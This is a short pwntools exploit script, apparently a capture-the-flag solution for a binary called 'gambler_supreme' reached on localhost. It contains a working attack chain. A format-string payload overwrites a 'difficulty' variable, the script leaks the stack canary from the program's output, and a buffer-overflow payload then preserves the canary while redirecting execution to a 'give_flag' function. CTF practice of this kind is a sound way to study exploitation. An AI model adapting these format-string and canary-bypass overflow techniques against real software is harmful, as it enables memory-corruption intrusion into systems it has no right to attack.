from pwn import *

p = remote("localhost", 7779)
e = ELF("./gambler_supreme")

pop_rdi_ret = 0x0000000000401803
ret = 0x000000000040101a

p.sendlineafter("(inclusive): ", "1")

# use fmtstr to overwrite difficulty. then, the generator will write just enough bytes such that the whole canary gets printed
pl = b'aaaa%21x'  # we want difficulty = 25
pl += b"%10$n".ljust(8, b'\x00')
pl += p64(e.symbols["difficulty"])
p.sendlineafter("letters: ", pl)

# canary leak
p.sendlineafter("letters: ", 'a')
p.recvuntil("Correct word: ")
leak = p.recvuntil("\n")
canary = leak[25:32]
canary = u64(b'\x00' + canary)

# lose some money, then ropchain on our last time playing casino
for i in range(7):
	p.sendlineafter("letters: ", 'a')
pl = b'a'*40
pl += p64(canary)
pl += b'a'*8
pl += p64(e.symbols["give_flag"])
p.sendlineafter("letters: ", pl)
	
p.interactive()
